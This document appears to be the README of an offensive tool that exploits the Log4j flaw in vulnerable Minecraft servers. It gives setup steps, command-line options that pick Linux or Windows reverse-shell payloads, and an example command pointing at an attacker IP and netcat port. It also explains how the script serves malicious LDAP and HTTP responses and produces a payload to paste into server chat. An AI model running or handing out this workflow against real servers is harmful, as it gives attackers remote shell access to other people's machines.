Minecraft Log4j Exploit Tool
==============================

This tool is used for testing log4j exploits on a vulnerable Minecraft server using custom Java payloads


Setup Instructions
--------------------

1. Grab a Java version

- Offical Oracle Java archive

    https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

    **Note: ** You do need an Oracle account to download the package

- Unoffical Java 8u181 archive

    https://repo.huaweicloud.com/java/jdk/8u181-b13/

2. Modify **exploit.py**

- Modify these lines with the correct paths

    JAVA_BIN='path/to/bin/java'
    JAVAC_BIN='path/to/bin/javac'

Example:

    JAVA_BIN='jdk1.8.0_181/bin/java'  
    JAVAC_BIN='jdk1.8.0_181/bin/javac'


Running Exploits
--------------------

Use the following command:

    python exploit.py

General Options:

    --exploit   Load a specific exploit     DEFAULT: exploits/linRevShell.java
    --userip    Specify your IP address     DEFAULT: localhost
    --webport   Specify http-server port    DEFAULT: 8080
    --lport     Specify netcat port         DEFAULT: 4444

Example:

    python exploit.py --exploit exploits/winRevShell.java --userip 192.168.0.100 --webport 8080 --lport 4444

This script will setup an HTTP and LDAP server for you, the respective ports being *\<lport\>* and *1389*. It will then create the payload you can paste into the vulnerable server char. If you're using a reverse shell exploit, it will remind you to start a netcat listener. If successful, you should see a 200 GET response from the HTTP server for **Exploit.class**.


Notes
--------------------

- All Java exploits must be stored in exploits/ directory
- All Java exploit class names must reamin "Exploit" to work with the dynamic compilation
